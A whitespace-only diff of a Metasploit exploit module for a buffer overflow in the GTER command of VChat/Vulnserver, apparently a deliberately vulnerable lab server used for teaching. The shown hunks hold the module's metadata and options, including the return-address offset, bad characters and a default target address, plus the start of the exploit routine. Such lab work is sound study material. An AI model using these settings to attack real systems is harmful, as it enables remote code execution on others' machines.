@@ -11,9 +11,7 @@
 
 class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
     Rank = NormalRanking	# Potential impact to the target
-  
     include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
-  
     def initialize(info = {})	# i.e. constructor, setting the initial values
       super(update_info(info,
         'Name'           => 'VChat/Vulnserver Buffer Overflow-GTER command Code Reuse',	# Name of the target
@@ -26,13 +24,12 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           [
             #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
             [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_CodeReuse' ]
-  
           ],
         'Privileged'     => false,
         'DefaultOptions' =>
           {
             'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
-          },      
+          },
         'Payload'        =>	# How to encode and generate the payload
           {
             'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
@@ -48,7 +45,6 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         ],
         'DefaultTarget'  => 0,
         'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
-        
         register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
             [
             OptInt.new('RETOFFSET_LTER', [true, 'Offset of Return Address in function GTER', 3506]),
@@ -57,8 +53,8 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
             Opt::RPORT(9999),
             Opt::RHOSTS('192.168.7.191')
         ])
-
     end
+
     def exploit	# Actual exploit
 
       encode_jump = datastore['JUMP_ENCODE'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
